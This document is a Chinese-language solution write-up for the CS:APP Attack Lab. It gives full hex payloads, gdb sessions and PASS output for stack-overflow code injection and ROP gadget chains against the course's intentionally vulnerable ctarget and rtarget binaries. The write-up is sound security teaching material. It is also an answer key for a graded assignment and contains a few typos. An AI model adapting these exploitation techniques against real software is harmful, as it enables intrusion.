# Lab3 - attacklab

仔细阅读官网上的说明指南，以下任务均是由指南发布的。

## Part I: Code Injection Attacks

```shell
objdump -d ctarget > ctarget.asm
```

第一部分的实验是通过代码注入攻击来实现函数跳转等目标。程序CTARGET没有任何防备。其入口为函数 ``test``

```c
void test() {
    int val;
    val = getbuf();
    printf("NO explit. Getbuf returned 0x%x\n", val);
}
```

### Phase 1

第一部分无需注入代码，只需令函数``test``执行完毕后跳转到``touch1``。

我们输入的字符串进入``getbuf``，查看其汇编代码

```assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

程序开辟了0x28字节的缓存空间，我们的输入要覆盖其缓冲区，并覆盖 **缓冲区-1** 地址，该地址为函数返回时跳转的地址。

```assembly
00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>
```

查看``touch1``的首地址为 0x4017c0，则我们的输入应是：任意40字节 + c0 17 40 00. 例如（为方便查看，以8个为一行，实际输入应在同一行并用空格隔开，下同）：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00
```

 将该结果保存为p1_l1.txt，并执行

```shell
./hex2raw < p1_l1.txt > p1_l1_raw.txt
```

随后运行

```shell
./ctarget -q -i p1_l1_raw.txt
```

成功完成 Phase 1.

```shell
root@b2ba8c04f8ed:/csapp/target1# ./ctarget -q -i p1_l1_raw.txt
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00
```

### Phase 2

该阶段需要插入``touch2``

```c
void touch2(unsigned val){
    vlevel = 2;
    if (val == cookie){
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

为使我们能走入成功分支，这里需要传入参数 cookie = 0x59b997fa。``touch2``的地址为 0x4017ec。

```assembly
00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  ...
```

那么，我们可以在程序中注入如下代码：

```ass
mov $0x59b997fa, %rdi
push $0x4017ec
ret
```

将上述内容保存为p1_l2.s，执行

```shell
gcc -c p1_l2.s
objdump -d p1_l2.o > p1_l2.d
```

得到如下汇编代码

```assembly

p1_l2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq  
```

我们的想法是让函数返回时调用该段代码，由 Phase 1 可知通过缓冲区溢出攻击可改变函数的返回值，那么我们只需让函数跳转至写有上述代码的地址处即可。由于我们的输入均在缓冲区，通过打断点的方式查看缓冲区的位置：

```shell
(gdb) break *0x4017ac
Breakpoint 1 at 0x4017ac: file buf.c, line 14.
(gdb) r -q
Starting program: /csapp/target1/ctarget -q
warning: Error disabling address space randomization: Operation not permitted
Cookie: 0x59b997fa

Breakpoint 1, getbuf () at buf.c:14
14      buf.c: No such file or directory.
(gdb) info registers rsp
rsp            0x5561dc78       0x5561dc78
```

可以发现执行``getbuf``第一步后的栈顶地址为 0x5561dc78，那么我们覆盖函数返回地址至此，并在此处写入我们的注入代码：

```
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55
```

将上述结果保存至 p1_l2.txt，执行

```
./hex2raw < p1_l2.txt | /.ctarget
```

完成！

当然，你也可以指定跳转的位置，例如跳转至 栈顶 + 0x8，那么注入代码为

```
00 00 00 00 00 00 00 00
48 C7 C7 FA 97 B9 59 68
EC 17 40 00 C3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
80 DC 61 55
```

### Phase 3


> tips :
>
> 1. 在[Ubuntu](http://blog.fpliu.com/it/os/Unix-like/GNU-Linux/distribution/Ubuntu)、[CentOS](http://blog.fpliu.com/it/os/Unix-like/GNU-Linux/distribution/CentOS)、[Fedora](http://blog.fpliu.com/it/os/Unix-like/GNU-Linux/distribution/Fedora)等 的[Docker](http://blog.fpliu.com/it/software/Docker)基础镜像中使用`man`命令查看使用手册的时候，会出现`No manual entry for xx`的提示，即便是安装了`Linux Man Pages`也还是于是无补， 这是因为[Docker](http://blog.fpliu.com/it/software/Docker)基础镜像的制作者为了减小镜像的体积，故意修改了包管理器的逻辑， 使得安装`Linux Man Pages`的时候没有安装真正的手册文件，不同的系统实现方法不一样，但是思路都是一样的， 就是在使用包管理器安装软件的时候把`man`目录中的内容删除掉。
>
> 2. **int strncmp(const char \*str1, const char \*str2, size_t n)** 把 **str1** 和 **str2** 进行比较，最多比较前 **n** 个字节。
>
> 3. **int sprintf(char \*str, const char \*format, ...)** 发送格式化输出到 **str** 所指向的字符串


Phase 3 的入口是函数 ``hexmatch``，目标同样是让我们通过代码注入的方式进入 ``touch3`` 并抵达正确的分支。

```c
int hexmatch(unsigned val, char *sval){
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval){
    vlevel = 3;
    if (hexmatch(cookie, sval)){
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

我们的目标是通过代码注入的方式，令程序跳转至 ``touch3``， 且在寄存器 %rdi 中存入我们想要注入字符串的地址，并在 ``hexmatch`` 中匹配生成的字符串的前9位。然而，生成字符串的地址使用了 ``random()`` 函数，其明确表示该字符串是难以预测的。

首先，我们先跳转到 ``touch3``。与 Phase 1 类似，输入可以覆盖返回地址并修改返回地址为 ``touch3`` 的序列为

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
fa 18 40 00
```

 我们按 Phase 1 的操作将上述序列输入至 ctarget，并在 0x4018cf，即函数 ``strncmp`` 处打断点，执行后如下所示

```shell
(gdb) break *0x4018cf
Breakpoint 1 at 0x4018cf: file visible.c, line 67.
(gdb) r -q -i p1_l3_raw.txt
...
(gdb) disas
Dump of assembler code for function hexmatch:
...
   0x00000000004018bf <+115>:   callq  0x400e70 <__sprintf_chk@plt>
   0x00000000004018c4 <+120>:   mov    $0x9,%edx
   0x00000000004018c9 <+125>:   mov    %rbx,%rsi
   0x00000000004018cc <+128>:   mov    %rbp,%rdi
=> 0x00000000004018cf <+131>:   callq  0x400ca0 <strncmp@plt>
```

这里就可以看出第一个输入的参数在 %rdi，对应sval；第二个输入的参数在 %rsi，对应s。查看寄存器中的值

```shell
(gdb) info registers rdi
rdi            0xd49260 13931104
(gdb) info registers rsi
rsi            0x5561dc13       1432476691
```

显然 0x5561dc13 就是

```c
char *s = cbuf + random() % 100;
```

计算出的值。由于此处存在随机因素，我们重复执行上述的操作，并查看 %rsi 中的值

```shell
(gdb) info registers rsi
rsi            0x5561dc13       1432476691
```

可以发现无论我们执行多少次，储存在 %rsi 中的值均不变。这里可能是一个伪随机数。

sprintf(s, "%.8x", val) 作用是把传入的 cookie 值存放在地址 0x5561dc13 上。

```shell
(gdb) x/s 0x5561dc13
0x5561dc13:     "59b997fa"
(gdb) x/8x 0x5561dc13
0x5561dc13:     0x35    0x39    0x62    0x39    0x39    0x37    0x66    0x61
```

现在的思路很明确，结合 Phase 1,2 的经验，我们需要做的事如下

1. 覆盖返回地址，跳转到堆栈指定位置（Phase 1）
2. 在指定位置处注入汇编代码，将参数传入 %rdi（Phase 2）
3. %rdi 中储存的是我们希望注入的字符串地址

那么主要的难点在于3。

首先用同样的方法查看目前栈顶的地址 

```shell
(gdb) info registers rsp
rsp            0x5561dc78       0x5561dc78
```

可以注入如下代码

```assembly
mov $0x5561dca8, %rdi
push %0x4018fa
ret
```

并在 0x5561dca8 处输入字符串对应的Ascii码

```
35 39 62 39 39 37 66 61
```

这里有一个疑问，为什么不将字符串储存在 0x5561dc88 - 0x5561dc98 这段位置呢？这是因为在进入 ``touch3`` 时，%rsp = 0x5561dca8，随后push了4次，将这部分地址的值改变了，如下所示

```shell
(gdb) x/16x 0x5561dc78
0x5561dc78:     0xa19ab800      0x04222cc9      0x5561dca8      0x00000000
0x5561dc88:     0x55685fe8      0x00000000      0x00000004      0x00000000
0x5561dc98:     0x00401916      0x00000000      0x55586000      0x00000000
0x5561dca8:     0x39623935      0x61663739      0x00401f00      0x00000000
```

为保险起见，我们将注入的字符串放在 0x5561dca8 这个位置，在执行 ``touch3, hexmatch``时不会改变此堆栈空间的值。

同 Level 2，将注入代码编译成汇编语言

```assembly

p1_l3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
   7:	68 fa 18 40 00       	pushq  $0x4018fa
   c:	c3                   	retq   
```

故我们注入的代码为

```
48 c7 c7 a8 dc 61 55 68 # 0x5561dc78 mov   $0x5561dca8,%rdi
fa 18 40 00 c3 00 00 00 # 0x5561dc80 pushq $0x4018fa
00 00 00 00 00 00 00 00 # 0x5561dc88
00 00 00 00 00 00 00 00 # 0x5561dc90
00 00 00 00 00 00 00 00 # 0x5561dc98
78 dc 61 55 00 00 00 00 # 0x5561dca0 跳转至 0x5561dc78
35 39 62 39 39 37 66 61 # 0x5561dca8 字符串ascii码
```

## Part II: Return-Oriented Programming

作者在题目的开头写道：

> Performing code-injection attacks on program RTARGET is much more difficult than it is for CTARGET, because it uses two techniques to thwart such attacks: 
>
> 1. It uses randomization so that the stack positions differ from one run to another. This makes it impossible to determine where your injected code will be located. 
> 2. It marks the section of memory holding the stack as nonexecutable, so even if you could set the program counter to the start of your injected code, the program would fail with a segmentation fault.
>
> 对程序RTARGET执行代码注入攻击比对CTARGET执行代码注入攻击困难得多，因为它使用两种技术来阻止此类攻击：
>
> 1. 它使用随机化，以便堆栈位置在不同的运行中有所不同。这使得无法确定注入代码的位置。
> 2. 它将存放堆栈的内存部分标记为不可执行，因此即使您可以将程序计数器设置为注入代码的开头，程序也会因分段错误而失败。

我们就是要克服这两种困难，来完成我们的攻击。

### Phase 4

这一阶段我们需要抵达 rtarget 的 ``touch3`` 。

首先，反汇编 rtarget

```shell
objdump -d rtarget > rtarget.asm
```

由题意，我们可以从 ``start_farm`` 和 ``end_farm`` 之间的代码块中找  **gargets**。此题用两个  **gargets** 即可。我们先来找 pop 指令，其对应的字节码为 0x58 - 0x5f。从 rtarget.asm 中可以找到相关函数：

```assembly
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq  
  
  ...
00000000004019db <getval_481>:
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  4019e0:	c3                   	retq
```

我们找到了含有 58 和 5c 的代码段。注意到

- 0x90：令程序计数器 +1，相当于空操作（no operation）。
- 0xc3：执行 ``ret`` 返回。

那我们移动到 0x4019ab 时，相当于执行了

```assembly
popq %rax
ret
```

我们可以控制当前堆栈中弹出的值，现在就是想办法把 %rax 移入 %rdi，并跳转至 ``touch2``。mov %rax, %rsp 对应的机器码为：48 89 c7.

注意到

```assembly
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq
```

恰好满足我们的需求，只需移动到 0x4019c5，便可执行

```assembly
movq %rax, %rdi
ret
```

接下来就很简单了，需要按以下步骤执行：

1. 跳转至 0x4019ab
2. 执行指令，将栈中的 cookie( = 0x59b997fa) 压出，赋给 %rax
3. 跳转至 0x4019c5
4. 执行指令，将 %rax 赋给 %rdi
5. 跳转至 ``touch2``，即 0x4017ec 

基于以上步骤，我们可以快速写出攻击代码

``` 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
c5 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

成功！

### Phase 5

这一阶段我们需要抵达 rtarget 的 ``touch3`` 。需要做的是：

1. 将字符串 "59b997fa" 的地址赋给 %rdi
2. 跳转至``touch3``

稍加思考，可以整理出如下思路：

1. 将当前栈的地址赋给一个寄存器A
2. 将（寄存器A的值 + 字符串偏移当前栈的大小）赋给寄存器B
3. 将寄存器B赋给 %rdi
4. 跳转至``touch3`` 

这里有两个难点：

1. 当前栈地址
2. 加法指令

题中并未给出加法指令，那么我们该如何执行加法呢？

突然，我们发现了一条有实际意义的指令

```assembly
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq 
```

该函数可以使得 %rax = %rdi + %rsi。我们的思路是 %rdi, %rsi 存储 栈地址 + 偏移量。

当前栈的地址储存在 %rsp 中。mov %rsp, 寄存器 的机器码为 48 89 e0 ~ e7 。在 farm 中查找相关代码有

```assembly
0000000000401a03 <addval_190>:
  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
  401a09:	c3                   	retq 
```

地址 0x401a06 执行的指令为

```assembly
movq %rsp, %rax
ret
```

继续找 movq %rax 的指令

```assembly
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3
```

地址 0x4019c5 执行的指令为

```assembly
movq %rax, %rdi
ret
```

至此，%rsp 的值已保存在 %rdi 中，那么 %rdi 就存储栈地址，我们需要给 %rsi 赋值偏移量。这里立即想到popq指令：

```assembly
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3
```

还是需要借用 0x4019ab 处的指令

```assembly
popq %rax
ret
```

再将 %rax 赋给 %rsi 即可：

糟糕！farm 里没有 %rax -> %rsi 相关指令，我们需借助其他寄存器来转移到 %rsi。首先找那些寄存器可以移动至 %rsi:

? -> %rsi ：经查，有且仅有有机器码 89 ce : movl %ecx, %esi 满足要求：

```assembly
0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3
```

地址 0x401a13 执行的指令为

```assembly
movl %ecx, %esi
ret
```

以下过程略，可以通过机器码 89 c2, 89 d1 来实现 %eax -> %edx -> %ecx

```assembly
0000000000401a40 <addval_487>:
  401a40:	8d 87 89 c2 84 c0    	lea    -0x3f7b3d77(%rdi),%eax
  401a46:	c3                   	retq
```

```assembly
0000000000401a68 <getval_311>:
  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
  401a6d:	c3
```

且指令 84 c0, 08 db 均不改变寄存器的值，故不影响最终的结果。综上，我们完成了

%rax -> %rsi : %eax -> %edx -> %ecx -> %esi

执行加法指令后再把 %rax 赋给 %rdi 即可。

最后再跳转至 ``touch3`` 。

综上所述，满足条件的指令为

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00 # movq %rsp, %rax  ret
c5 19 40 00 00 00 00 00 # movq %rax, %rdi  ret
ab 19 40 00 00 00 00 00 # popq %rax        ret
48 00 00 00 00 00 00 00 # 存储偏移量值，赋给 %rax
42 1a 40 00 00 00 00 00 # movl %eax, %edx  ret
69 1a 40 00 00 00 00 00 # movl %edx, %ecx  ret
13 1a 40 00 00 00 00 00 # movl %ecx, %esi  ret
d6 19 40 00 00 00 00 00 # leq  (%rdi,%rsi,1),%rax  ret
c5 19 40 00 00 00 00 00 # movq %rax, %rdi  ret
fa 18 40 00 00 00 00 00 # 跳转到touch3
35 39 62 39 39 37 66 61 # 0x5561dca8 字符串ascii码
00 00 00 00 00 00 00 00 # 字符串以\0x 结尾
```

当我们确定了所有指令后，才能得到偏移量，为 9 * 8 = 0x48。输入上述指令，成功！

```shell
root@b2ba8c04f8ed:/csapp/target1# ./hex2raw < p2_l3.txt | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 42 1A 40 00 00 00 00 00 69 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00
```
